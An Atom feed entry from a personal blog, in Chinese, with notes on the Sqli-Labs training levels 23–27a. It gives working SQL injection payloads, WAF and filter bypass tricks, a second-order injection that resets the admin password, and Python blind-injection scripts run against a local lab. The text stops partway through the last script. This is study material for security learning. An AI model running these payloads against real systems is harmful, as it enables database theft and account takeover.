<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gard3nia&#39;s Notebook</title>
  
  <subtitle>且将新火试新茶,诗酒趁年华</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://gardenia30.top/"/>
  <updated>2019-07-07T13:24:31.744Z</updated>
  <id>https://gardenia30.top/</id>
  
  <author>
    <name>Gard3nia</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sqli-Labs笔记-Advanced</title>
    <link href="https://gardenia30.top/2019/07/07/Sqli-Labs%E7%AC%94%E8%AE%B0-Advanced/"/>
    <id>https://gardenia30.top/2019/07/07/Sqli-Labs笔记-Advanced/</id>
    <published>2019-07-07T06:50:40.000Z</published>
    <updated>2019-07-07T13:24:31.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>小刷一波，了解一下怎么bypass WAF<a id="more"></a></p><h2 id="less-23-报错注入-过滤注释"><a href="#less-23-报错注入-过滤注释" class="headerlink" title="less-23(报错注入+过滤注释)"></a>less-23(报错注入+过滤注释)</h2><p>拿到手先试一下单引号，报错，以为很简单，但是想到已经是进阶版的注入，在尝试了注释掉后面内容以后发现一直在报错，果然没那么简单……在尝试完所有的注释符号后我发现……可能是过滤掉了注释符号……</p><p>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>成功闭合，所以下面就是常规操作…</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>查看源码：</p><p>过滤函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure><p>有print出来error，所以允许报错注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff"&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="less-24-二次注入"><a href="#less-24-二次注入" class="headerlink" title="less-24(二次注入)"></a>less-24(二次注入)</h2><p>上来是个登录界面，有注册和修改密码功能，先注册一个新账号，登录后发现<code>YOU ARE LOGGED IN</code>字样，第一次登陆还需要修改密码；此题的目的应该是冒充admin用户登录。</p><p>三个核心功能：登录，注册，修改密码，一个个看；</p><p><img src="https://s2.ax1x.com/2019/05/29/Vu0n3t.png" alt="Vu0n3t.png"></p><p>退出登录寻找注入点，这里的目的应该是要用admin用户的身份登录；在登录界面随手尝试；尝试万能密码 <code>admin&#39; or &#39;1&#39;=&#39;1</code>发现不可以，那应该就是过滤了其中的一些字符集，注入点应该不在这个页面；最后发现是一个二次注入的题目；</p><h3 id="为什么在主页不能实现直接注入？"><a href="#为什么在主页不能实现直接注入？" class="headerlink" title="为什么在主页不能实现直接注入？"></a>为什么在主页不能实现直接注入？</h3><p>在<strong>login.php</strong>中对输入的参数进行了特殊字符转义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"><span class="comment">//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be real smart, Try harder!!!! :( '</span>);</span><br><span class="line">   $row = mysql_fetch_row($res);</span><br><span class="line"><span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line"><span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mysql_real_escape_string</code> 转义 <code>SQL</code> 语句中使用的字符串中的特殊字符，所以此时是不可以直接在登录页上进行注入的；那就要寻找其他注入点，</p><h3 id="为什么注册页面不可以直接注入？"><a href="#为什么注册页面不可以直接注入？" class="headerlink" title="为什么注册页面不可以直接注入？"></a>为什么注册页面不可以直接注入？</h3><p>可利用部分没有查询语句，只有插入语句……</p><h3 id="为什么注册功能可以成功写入特殊字符？"><a href="#为什么注册功能可以成功写入特殊字符？" class="headerlink" title="为什么注册功能可以成功写入特殊字符？"></a>为什么注册功能可以成功写入特殊字符？</h3><p>本题还有两个链接，一个是忘记密码（没什么luan用，还有一张极为不爽的图），还有一个就是注册用户，拿出注册的源码来看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;</span><br><span class="line">$pass= mysql_escape_string($_POST[&apos;password&apos;]);</span><br><span class="line">$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);</span><br></pre></td></tr></table></figure><p>这里对输入的账户和密码进行了特殊字符转义处理，即在特殊字符前面加上<code>\</code>，但是在加上转义符号以后，写入数据库时，写入进去的数据是没有<code>\</code>的，如下所示：</p><p><img src="https://i.loli.net/2019/06/29/5d175163534d483323.png" alt=""></p><p>插入时<code>&#39;</code>是带了转义符号的，但是插入以后查询却显示没有转义符号，所以这就给二次注入留下了机会；</p><h3 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入?"></a>什么是二次注入?</h3><blockquote><p>二次注入也称为存储型注入，就是将可能导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入。</p></blockquote><p>1.这里我们创建新账户<code>admin&#39;#</code>，虽然在写入时<code>#</code>会被转义，但是写入数据库里的还是原来的符号，并没有添加转义符号，所以这里可以成功写入用户名<code>admin&#39;#</code>；</p><p>2.我们拿<code>admin&#39;#</code>用户登录，看到回显的是修改密码的页面，</p><p><img src="https://i.loli.net/2019/06/29/5d1750f8ef7d942666.png" alt=""></p><p>审计修改密码的源码，发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">$curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">$pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure><p><code>username</code>没有做任何过滤和转义，这里的session里的用户名就是当前维持会话的用户<code>admin#</code>，</p><p>3.寻找注入点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br></pre></td></tr></table></figure><p>这里输入的<code>username</code>为<code>admin#</code>会直接将后面的内容注释掉，所以形成的最后的语句就是：</p><p><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></p><p>此时就会将真的<code>admin</code>用户的密码修改为这里的<code>$pass</code>，这样的话就可以直接拿修改密码后的<code>admin</code>用户来登录，拿到<code>admin</code>的账户了；</p><p><img src="https://i.loli.net/2019/06/29/5d1751fd4924141073.png" alt=""></p><h2 id="less-25-and-or过滤，字符型"><a href="#less-25-and-or过滤，字符型" class="headerlink" title="less-25(and/or过滤，字符型)"></a>less-25(and/or过滤，字符型)</h2><p>初步测试发现是单引号字符型注入，继续测试，从hint发现<code>and</code>和<code>or</code>都被过滤了，尝试双写，绕过成功…也可以使用<code>||和&amp;&amp;</code>绕过</p><p><img src="https://i.loli.net/2019/06/29/5d175ee7c64cb28731.png" alt=""></p><p>具体的绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.&amp;&amp; ||</span><br><span class="line">2.大小写变形Or,OR,oR</span><br><span class="line">3.编码，例如hex，urlencode</span><br><span class="line">4.添加注释/*or*/</span><br><span class="line">5.利用符号and=&amp;&amp; or=||</span><br><span class="line">6.双写绕过</span><br></pre></td></tr></table></figure><p>接下来就是常规操作</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(username),group_concat(passwoorrd) from users--+</span><br></pre></td></tr></table></figure><p>也可报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; %26%26 updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>查看源码危险的过滤函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);//strip out OR (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);//Strip out AND (non case sensitive)</span><br><span class="line"></span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="less-25a-and-or过滤，数字型，blind"><a href="#less-25a-and-or过滤，数字型，blind" class="headerlink" title="less-25a(and/or过滤，数字型，blind)"></a>less-25a(and/or过滤，数字型，blind)</h2><p>初步测试发现为数字型注入，过滤掉了<code>and</code>和<code>or</code>，双写绕过……</p><p><img src="https://i.loli.net/2019/06/29/5d175fbff327831362.png" alt=""></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(username),group_concat(passwoorrd) from users</span><br></pre></td></tr></table></figure><h2 id="less-26-空格-注释过滤，字符型"><a href="#less-26-空格-注释过滤，字符型" class="headerlink" title="less-26(空格/注释过滤，字符型)"></a>less-26(空格/注释过滤，字符型)</h2><p>fuzz半天没出来，直接查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);//strip out OR (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);//Strip out AND (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #</span><br><span class="line">$id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);//Strip out spaces</span><br><span class="line">$id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);//Strip out slashes</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤掉了…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or and /* -- # 空格  \ /</span><br></pre></td></tr></table></figure><p>过滤掉注释符号只有一种办法解决，那就是构造如下语句闭合句末的引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>过滤掉空格是一件非常头疼的事情，下面重点探讨一下空格的绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br><span class="line">%20 urlencode</span><br><span class="line">/**/ 注释</span><br></pre></td></tr></table></figure><p>这里使用<code>%a0</code>来绕过</p><p>报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27%a0%26%26%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0||%271%27=%271</span><br></pre></td></tr></table></figure><h2 id="less-26a-空格-注释过滤，字符型，blind"><a href="#less-26a-空格-注释过滤，字符型，blind" class="headerlink" title="less-26a(空格/注释过滤，字符型，blind)"></a>less-26a(空格/注释过滤，字符型，blind)</h2><p>这题对比26的区别就是不能报错注入，那就直接盲注吧，直接上盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/Less-26a/"</span></span><br><span class="line">payload=<span class="string">"?id=1')%a0aandnd%a0ascii(substr(database(),&#123;len&#125;,1))=&#123;ascii&#125;%a0%26%26%a0('1'='1"</span></span><br><span class="line">database_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">database_name+=chr(j)</span><br><span class="line">print(database_name)</span><br></pre></td></tr></table></figure><h2 id="less-27-select-union绕过，字符型"><a href="#less-27-select-union绕过，字符型" class="headerlink" title="less-27(select/union绕过，字符型)"></a>less-27(select/union绕过，字符型)</h2><p>黑名单继续添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);    //Strip out select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一次直接将联合查询过滤了，查询也不能用，<code>union select</code>都过滤了，而且<code>select</code>还过滤了两次，直接双写绕过或者大小写混写即可</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27%a0uniounionn%a0selecselecselecttt%a02,(selecselecselecttt%a0group_concat(username)%a0from%a0users),4%a0||%a0%271%27=%271</span><br></pre></td></tr></table></figure><p>或者直接报错注入:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and%271%27=%271</span><br></pre></td></tr></table></figure><h2 id="less-27a-select-union绕过-字符型"><a href="#less-27a-select-union绕过-字符型" class="headerlink" title="less-27a(select/union绕过,字符型)"></a>less-27a(select/union绕过,字符型)</h2><p>区别就是双引号</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%22%a0uniunionon%a0selecselecselecttt%a02,(selecselecselecttt%a0group_concat(password)from%a0users),4||%221%22=%221</span><br></pre></td></tr></table></figure><p>很久没写盲注脚本了，给出一个exp吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/Less-27a/"</span></span><br><span class="line">ans=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_database</span><span class="params">()</span>:</span></span><br><span class="line">database_name=<span class="string">""</span></span><br><span class="line">payload1=<span class="string">'?id=1"%a0and%a0ascii(substr(database(),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload1.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">database_name+=chr(j)</span><br><span class="line"><span class="comment"># print(database_name)</span></span><br><span class="line">ans.update(databasename=database_name)</span><br><span class="line"><span class="comment"># return database_name</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_tables</span><span class="params">()</span>:</span></span><br><span class="line">table=[]</span><br><span class="line">payload2=<span class="string">'?id=1"%a0and%a0ascii(substr((seleCt%a0table_name%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0limit%a0&#123;num&#125;,1),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">table_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload2.format(num=k,len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">table_name+=chr(j)</span><br><span class="line"><span class="keyword">if</span> table_name!=<span class="string">''</span>:</span><br><span class="line"><span class="comment"># print(table_name)</span></span><br><span class="line">table.append(table_name)</span><br><span class="line">ans.update(tablenames=table)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_columns</span><span class="params">(tablename)</span>:</span></span><br><span class="line">column=[]</span><br><span class="line">payload3=<span class="string">'?id=1"%a0and%a0ascii(substr((seleCt%a0column_name%a0from%a0information_schema.columns%a0where%a0table_name='</span>+tablename+<span class="string">'%a0limit%a0&#123;num&#125;,1),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">column_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload3.format(num=k,len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">column_name+=chr(j)</span><br><span class="line"><span class="keyword">if</span> column_name!=<span class="string">''</span>:</span><br><span class="line"><span class="comment"># print(column_name)</span></span><br><span class="line">column.append(column_name)</span><br><span class="line">ans.update(columnnames=column)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_data</span><span class="params">(choice)</span>:</span></span><br><span class="line">data1=[]</span><br><span class="line">payload4=<span class="string">'?id=1"%a0and%a0ascii(substr((seleCt%a0'</span>+choice+<span class="string">'%a0from%a0users%a0limit%a0&#123;num&#125;,1),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">user_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload4.format(num=k,len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">user_name+=chr(j)</span><br><span class="line"><span class="keyword">if</span> user_name!=<span class="string">''</span>:</span><br><span class="line"><span class="comment"># print(user_name)</span></span><br><span class="line">data1.append(user_name)</span><br><span class="line">ans.update(data=data1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">print(<span class="string">'[+]Let us start SQL Injection and have fun'</span>)</span><br><span class="line">print(<span class="string">'[+]loading database name......'</span>)</span><br><span class="line">show_database()</span><br><span class="line">print(<span class="string">'[+]Database name:'</span>+ans[<span class="string">'databasename'</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">'\n[+]loading table name......'</span>)</span><br><span class="line">show_tables()</span><br><span class="line">print(<span class="string">'[+]Table names:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans[<span class="string">'tablenames'</span>]:</span><br><span class="line">print(<span class="string">'[*]'</span>+i)</span><br><span class="line"></span><br><span class="line">table_temp=input(<span class="string">'\n[+]Please choose one of the tables:'</span>)</span><br><span class="line">t_name=<span class="string">'"'</span>+table_temp+<span class="string">'"'</span></span><br><span class="line">print(<span class="string">'[+]loading column name......'</span>)</span><br><span class="line">show_columns(t_name)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans[<span class="string">'columnnames'</span>]:</span><br><span class="line">print(<span class="string">'[*]'</span>+i)</span><br><span class="line"></span><br><span class="line">column=input(<span class="string">"\nPlease choose one of the columns:"</span>)</span><br><span class="line">print(<span class="string">"[+]loading data......"</span>)</span><br><span class="line">show_data(column)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans[<span 